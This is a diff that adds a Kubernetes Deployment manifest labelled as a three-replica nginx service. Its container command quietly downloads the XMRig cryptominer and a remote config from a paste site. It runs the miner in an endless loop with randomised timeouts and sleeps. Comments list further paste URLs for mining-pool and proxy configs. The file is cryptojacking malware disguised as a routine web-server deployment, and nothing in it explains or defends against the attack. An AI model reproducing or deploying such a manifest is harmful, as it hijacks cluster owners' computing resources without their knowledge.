@@ -1,0 +1,34 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  labels:
+    app: nginx
+  name: nginx
+spec:
+  replicas: 3
+  selector:
+    matchLabels:
+      app: nginx
+  template:
+    metadata:
+      labels:
+        app: nginx
+    spec:
+      containers:
+      - image: nginx
+        name: nginx3
+        command:
+          - bash
+          - -c 
+          - curl -o /var/tmp/xmrig -L https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz;curl -o /var/tmp/config.json http://hastebin.com/raw/aroyigetov;chmod 777 /var/tmp/xmrig;cd /var/tmp;tar -xvf xmrig;cp xmrig-6.14.0/xmrig ./xmrig;while true;do timeout $(($(($RANDOM%(3600-600+1)))+600)) ./xmrig -c config.json;sleep $(($(($RANDOM%(5000-600+1)))+600));done
+        resources: {}
+
+        # https://pastebin.com/raw/9sxsXLrM minexmr
+        # https://pastebin.com/raw/zpPfSnzT nanopool
+        # > /dev/null 2>&1
+
+        # sat 14 august 1900
+
+        # con proxy http://hastebin.com/raw/suwesevuxe
+        # no proxy http://hastebin.com/raw/oxuyadazes
+        # http://hastebin.com/raw/aroyigetov
